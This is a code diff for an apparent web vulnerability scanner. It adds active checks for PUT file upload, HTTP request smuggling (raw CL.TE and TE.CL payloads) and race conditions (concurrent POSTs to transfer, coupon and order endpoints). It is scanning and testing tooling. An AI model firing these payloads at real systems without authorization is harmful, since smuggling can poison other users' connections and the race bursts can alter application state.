@@ -18,6 +18,7 @@ import (
 	"regexp"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/chromedp/chromedp"
@@ -1981,30 +1982,93 @@ func (p *CRLFPlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 45. DANGEROUS HTTP METHODS
+// 45. DANGEROUS HTTP METHODS - v2
 type DangerousMethodsPlugin struct{}
 
 func (p *DangerousMethodsPlugin) Name() string { return "Dangerous HTTP Methods" }
+
 func (p *DangerousMethodsPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
 		return nil
 	}
-	// Try to upload a file to server via PUT (Fake request)
-	req, _ := http.NewRequest("PUT", getURL(target, "/dorm_test.txt"), strings.NewReader("test"))
-	resp, err := getClient().Do(req)
+
+	// 1. OPTIONS CHECK (PASSIVE)
+	// Check what methods the server CLAIMS to support.
+	reqOptions, _ := http.NewRequest("OPTIONS", getURL(target, "/"), nil)
+	respOptions, err := getClient().Do(reqOptions)
+	if err == nil {
+		defer respOptions.Body.Close()
+		allowHeader := respOptions.Header.Get("Allow")
+
+		// TRACE is dangerous (XST attacks), verify it explicitly.
+		if strings.Contains(allowHeader, "TRACE") {
+			return &Vulnerability{
+				Target:      target,
+				Name:        "Dangerous Method (TRACE)",
+				Severity:    "MEDIUM",
+				CVSS:        5.0,
+				Description: "The server supports the TRACE method, which can lead to Cross-Site Tracing (XST) attacks.",
+				Solution:    "Disable the TRACE method in web server configuration.",
+				Reference:   "OWASP XST",
+			}
+		}
+	}
+
+	// 2. PUT METHOD VERIFICATION (ACTIVE)
+	// Instead of just checking status code, we try to Upload -> Verify -> Delete.
+
+	// Generate a random filename and unique content to avoid collisions and false positives.
+	randomID := fmt.Sprintf("%d", time.Now().UnixNano())
+	testFileName := fmt.Sprintf("/dorm_test_%s.txt", randomID)
+	testContent := fmt.Sprintf("DORM_SECURITY_CHECK_%s", randomID)
+
+	// A) Try to UPLOAD (PUT)
+	reqPut, _ := http.NewRequest("PUT", getURL(target, testFileName), strings.NewReader(testContent))
+	reqPut.Header.Set("Content-Type", "text/plain")
+
+	respPut, err := getClient().Do(reqPut)
 	if err != nil {
 		return nil
 	}
-	defer resp.Body.Close()
+	respPut.Body.Close()
 
-	if resp.StatusCode == 201 || resp.StatusCode == 200 {
-		return &Vulnerability{
-			Target: target, Name: "PUT Method Enabled", Severity: "HIGH", CVSS: 7.5,
-			Description: "File upload via PUT is possible.",
-			Solution:    "Disable unnecessary HTTP methods.",
-			Reference:   "",
+	// If server says "Created" (201) or "OK" (200), we must VERIFY.
+	// Many servers return 200 but ignore the upload (Soft Success).
+	if respPut.StatusCode == 201 || respPut.StatusCode == 200 {
+
+		// B) Try to READ back (GET)
+		reqGet, _ := http.NewRequest("GET", getURL(target, testFileName), nil)
+		respGet, err := getClient().Do(reqGet)
+
+		if err == nil {
+			defer respGet.Body.Close()
+
+			// Read the content
+			bodyBytes, _ := io.ReadAll(respGet.Body)
+			uploadedContent := string(bodyBytes)
+
+			// C) COMPARE
+			// Does the server content match exactly what we sent?
+			if strings.Contains(uploadedContent, testContent) {
+
+				// D) CLEANUP (DELETE)
+				// Be a polite scanner, remove the file.
+				reqDel, _ := http.NewRequest("DELETE", getURL(target, testFileName), nil)
+				getClient().Do(reqDel)
+
+				return &Vulnerability{
+					Target:      target,
+					Name:        "Arbitrary File Upload (PUT)",
+					Severity:    "CRITICAL", // Real upload confirmed, this is Critical.
+					CVSS:        9.1,
+					Description: fmt.Sprintf("Confirmed file upload via PUT method.\nFile: %s\nContent Verified: Yes", testFileName),
+					Solution:    "Disable the PUT method or implement strict authentication/authorization.",
+					Reference:   "CWE-434: Unrestricted Upload",
+				}
+			}
 		}
 	}
+
 	return nil
 }
 
@@ -3408,6 +3472,313 @@ func (p *ShadowAPIPlugin) Run(target ScanTarget) *Vulnerability {
 }
 
 // ==========================================
+// 84. HTTP REQUEST SMUGGLING (INTERFERENCE DETECTOR)
+// ==========================================
+
+type RequestSmugglingPlugin struct{}
+
+func (p *RequestSmugglingPlugin) Name() string { return "HTTP Request Smuggling (Advanced)" }
+
+func (p *RequestSmugglingPlugin) Run(target ScanTarget) *Vulnerability {
+	if !isWebPort(target.Port) {
+		return nil
+	}
+
+	// Helper to establish raw TCP/TLS connection
+	connect := func() (net.Conn, error) {
+		address := net.JoinHostPort(target.IP, strconv.Itoa(target.Port))
+		dialer := &net.Dialer{Timeout: 5 * time.Second}
+
+		if target.Port == 443 || target.Port == 8443 {
+			return tls.DialWithDialer(dialer, "tcp", address, &tls.Config{InsecureSkipVerify: true})
+		}
+		return net.DialTimeout("tcp", address, 5*time.Second)
+	}
+
+	// Helper to send data and read response(s)
+	// We expect multiple responses or a specific reaction.
+	checkSmuggle := func(payload string, attackName string) *Vulnerability {
+		conn, err := connect()
+		if err != nil {
+			return nil
+		}
+		defer conn.Close()
+
+		// 1. Send the Pipeline (Attack + Victim Request)
+		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
+		_, err = conn.Write([]byte(payload))
+		if err != nil {
+			return nil
+		}
+
+		// 2. Read Responses
+		// We expect the server to process the first request, and if vulnerable,
+		// the second request will be "poisoned" by the smuggled prefix.
+		conn.SetReadDeadline(time.Now().Add(5 * time.Second))
+
+		// Read a large chunk to capture potentially two responses
+		buf := make([]byte, 4096)
+		n, err := conn.Read(buf)
+		if err != nil && err != io.EOF {
+			// If timeout occurs here, it MIGHT be time-based smuggling,
+			// but we are looking for interference (status code change).
+			return nil
+		}
+		response := string(buf[:n])
+
+		// 3. ANALYSIS LOGIC
+		// We smuggled a request for "/dorm-404".
+		// If the server returns a 404 Not Found (and normally it's 200), we nailed it.
+		// Or if we see a "405 Method Not Allowed" because we smuggled a weird method.
+
+		if strings.Contains(response, "404 Not Found") && strings.Contains(response, "dorm-404") {
+			// Strong indicator: The server reflected our smuggled path in the error
+			return &Vulnerability{
+				Target:      target,
+				Name:        "HTTP Request Smuggling (" + attackName + ")",
+				Severity:    "CRITICAL",
+				CVSS:        9.8,
+				Description: fmt.Sprintf("Server processed a smuggled request. The follow-up request triggered a 404 for the smuggled path '/dorm-404'.\n\nPayload:\n%s", payload),
+				Solution:    "Disable HTTP/1.1 connection reuse (Keep-Alive) on the backend or use HTTP/2.",
+				Reference:   "PortSwigger: HTTP Request Smuggling",
+			}
+		}
+
+		// Check for 405 Method Not Allowed (If we smuggled a bad method like GPOST)
+		if strings.Contains(response, "405 Method Not Allowed") {
+			return &Vulnerability{
+				Target:      target,
+				Name:        "HTTP Request Smuggling (" + attackName + ")",
+				Severity:    "CRITICAL",
+				CVSS:        9.8,
+				Description: "Server returned 405 Method Not Allowed for the follow-up request, indicating the smuggled prefix 'GPOST' poisoned the socket.",
+				Solution:    "Disable HTTP/1.1 connection reuse (Keep-Alive) on the backend or use HTTP/2.",
+				Reference:   "PortSwigger: HTTP Request Smuggling",
+			}
+		}
+
+		return nil
+	}
+
+	// --- ATTACK VECTORS ---
+
+	// Vector 1: CL.TE (Frontend uses Content-Length, Backend uses Transfer-Encoding)
+	// We trick Backend into thinking the request ended early (at '0'),
+	// so 'GPOST /dorm-404...' becomes the start of the NEXT request.
+	// NOTE: Content-Length must be calculated precisely.
+	// The body is:
+	// 0\r\n
+	// \r\n
+	// GPOST /dorm-404 HTTP/1.1\r\n
+	// Foo: x
+	//
+	// Total bytes of body = 3 + 2 + 28 + 8 = 41 bytes approx.
+	// Frontend sees CL=6 (matches '0\r\n\r\n').
+	// Backend sees TE (chunked), reads '0', stops. The rest is smuggled.
+
+	// Constructing the smuggled prefix to poison the next request
+	smuggledPrefix := "GPOST /dorm-404 HTTP/1.1\r\nFoo: x"
+
+	chunkBody := "0\r\n\r\n" + smuggledPrefix
+	finalClTe := fmt.Sprintf("POST / HTTP/1.1\r\n"+
+		"Host: %s\r\n"+
+		"Connection: keep-alive\r\n"+
+		"Content-Length: %d\r\n"+
+		"Transfer-Encoding: chunked\r\n"+
+		"\r\n"+
+		"%s"+
+		"GET / HTTP/1.1\r\n"+ // Immediate follow-up request
+		"Host: %s\r\n"+
+		"\r\n",
+		target.IP, len(chunkBody), chunkBody, target.IP)
+
+	if vuln := checkSmuggle(finalClTe, "CL.TE"); vuln != nil {
+		return vuln
+	}
+
+	// Vector 2: TE.CL (Frontend uses Transfer-Encoding, Backend uses Content-Length)
+	// Frontend sees TE, reads until '0'.
+	// Backend sees CL=4 (stops at '12\r\n'). The rest ('GPOST...') is smuggled.
+
+	teClBody := "1c\r\n" + // Chunk size (hex for 28)
+		"GPOST /dorm-404 HTTP/1.1\r\n" +
+		"Foo: x\r\n" +
+		"0\r\n\r\n"
+
+	finalTeCl := fmt.Sprintf("POST / HTTP/1.1\r\n"+
+		"Host: %s\r\n"+
+		"Connection: keep-alive\r\n"+
+		"Content-Length: 4\r\n"+ // Backend stops here
+		"Transfer-Encoding: chunked\r\n"+
+		"\r\n"+
+		"%s"+
+		"GET / HTTP/1.1\r\n"+ // Immediate follow-up
+		"Host: %s\r\n"+
+		"\r\n",
+		target.IP, teClBody, target.IP)
+
+	if vuln := checkSmuggle(finalTeCl, "TE.CL"); vuln != nil {
+		return vuln
+	}
+
+	return nil
+}
+
+// 85. RACE CONDITION TESTER
+
+type RaceConditionPlugin struct{}
+
+func (p *RaceConditionPlugin) Name() string { return "Race Condition (State Mutation)" }
+
+func (p *RaceConditionPlugin) Run(target ScanTarget) *Vulnerability {
+	if !isWebPort(target.Port) {
+		return nil
+	}
+
+	// 1. Target Selection Strategy
+	// Race conditions usually happen on specific endpoints involving write operations.
+	// Since we are scanning blindly, we try a list of high-probability targets.
+	commonEndpoints := []string{
+		"/api/vote",
+		"/api/coupon/apply",
+		"/api/transfer",
+		"/api/order",
+		"/register",
+		"/login",
+		"/cart/add",
+		"/", // Fallback
+	}
+
+	concurrencyLevel := 15
+	client := getClient() // Use global client
+
+	for _, endpoint := range commonEndpoints {
+		targetURL := getURL(target, endpoint)
+
+		// 2. Pre-Check (Discovery)
+		// Don't bomb an endpoint that returns 404.
+		// Send a single probe request first.
+		probeReq, _ := http.NewRequest("POST", targetURL, strings.NewReader("{}"))
+		probeReq.Header.Set("Content-Type", "application/json")
+		probeResp, err := client.Do(probeReq)
+
+		if err != nil {
+			continue
+		}
+		probeResp.Body.Close()
+
+		// If endpoint doesn't accept POST (404 Not Found, 405 Method Not Allowed), skip it.
+		if probeResp.StatusCode == 404 || probeResp.StatusCode == 405 {
+			continue
+		}
+
+		// 3. Prepare the Attack (The Gate Pattern)
+		var wg sync.WaitGroup
+		startGate := make(chan struct{})
+
+		statusCodes := make([]int, concurrencyLevel)
+		bodyLengths := make([]int64, concurrencyLevel)
+
+		for i := 0; i < concurrencyLevel; i++ {
+			wg.Add(1)
+			go func(index int) {
+				defer wg.Done()
+
+				// Construct a state-changing request (Mock JSON payload)
+				req, _ := http.NewRequest("POST", targetURL, strings.NewReader(`{"id": 1, "action": "test", "amount": 1}`))
+				req.Header.Set("User-Agent", "DORM-Race-Tester/2.0")
+				req.Header.Set("Content-Type", "application/json")
+				req.Header.Set("Cache-Control", "no-cache")
+
+				// Sync Point: Wait for the signal
+				<-startGate
+
+				resp, err := client.Do(req)
+				if err == nil {
+					defer resp.Body.Close()
+					statusCodes[index] = resp.StatusCode
+
+					// Read body to check for content variations
+					body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
+					bodyLengths[index] = int64(len(body))
+				}
+			}(i)
+		}
+
+		// Release the Kraken!
+		close(startGate)
+		wg.Wait()
+
+		// 4. Advanced Analysis (The Brain)
+		// We are looking for INCONSISTENCY in successful processing.
+
+		successCount := 0   // 2xx
+		blockCount := 0     // 409, 429 (Good defense)
+		serverErrCount := 0 // 5xx (Overload - Not vulnerability)
+
+		uniqueLengths := make(map[int64]int)
+
+		for i, code := range statusCodes {
+			if code == 0 {
+				continue
+			}
+
+			if code >= 200 && code < 300 {
+				successCount++
+				uniqueLengths[bodyLengths[i]]++
+			} else if code == 409 || code == 429 {
+				blockCount++
+			} else if code >= 500 {
+				serverErrCount++
+			}
+		}
+
+		// DECISION LOGIC:
+
+		// Case A: Server Overload (False Positive Protection)
+		// If mostly 5xx errors, it's just DoS/Instability, not a race condition.
+		if serverErrCount > concurrencyLevel/2 {
+			continue
+		}
+
+		// Case B: Proper Lock Implementation (Safe)
+		// If we see mixed 200 OK and 429 Too Many Requests or 409 Conflict,
+		// the server is correctly handling concurrency.
+		if successCount > 0 && blockCount > 0 {
+			continue
+		}
+
+		// Case C: The Sweet Spot (Potential Vulnerability)
+		// 1. Multiple successes (2xx) but with DIFFERENT content lengths.
+		//    (Means some requests were processed differently than others in the same batch).
+		// 2. We expected a limit (e.g. only 1 should work), but ALL worked (Logic Flaw).
+		//    *Note: Since we don't know the business logic, we focus on anomalies.*
+
+		isInteresting := false
+
+		// If distinct response lengths > 1 within successful requests, it implies diverse outcomes.
+		if successCount > 1 && len(uniqueLengths) > 1 {
+			isInteresting = true
+		}
+
+		// Reporting
+		if isInteresting {
+			return &Vulnerability{
+				Target:      target,
+				Name:        "Race Condition / State Inconsistency",
+				Severity:    "HIGH",
+				CVSS:        7.5,
+				Description: fmt.Sprintf("The endpoint %s exhibited inconsistent behavior under high concurrency.\nSuccessful Requests (2xx): %d\nUnique Response Lengths: %d\nThis suggests that parallel requests are affecting the application state unpredictably.", endpoint, successCount, len(uniqueLengths)),
+				Solution:    "Implement database row-level locking or atomic transactions.",
+				Reference:   "CWE-362: Race Condition",
+			}
+		}
+	}
+
+	return nil
+}
+
+// ==========================================
 // HELPER FOR SQL INJECTION (POST)
 // ==========================================
 
@@ -3470,6 +3841,6 @@ func GetPluginInventory() []string {
 		"Memcached Stats", "Anonymous FTP", "SMTP Open Relay", "API Key in JS Files", "Subdomain Takeover Risk",
 		"ASP.NET ViewState Encryption", "Laravel .env Disclosure", "ColdFusion Debugging", "Drupalgeddon2 RCE", "GitLab User Enum", "Nginx Alias Traversal",
 		"SSRF Cloud Metadata", "JWT None Algorithm", "Apache Struts RCE", "Citrix ADC Traversal", "NoSQL Injection (MongoDB)", "Atlassian Confluence RCE",
-		"Terraform State Exposure", "WebSocket Hijacking", "TeamCity Auth Bypass", "Shadow API Discovery", "Fuzzer",
+		"Terraform State Exposure", "WebSocket Hijacking", "TeamCity Auth Bypass", "Shadow API Discovery", "Fuzzer", "HTTP Request Smuggling", "Race Condition Tester",
 	}
 }
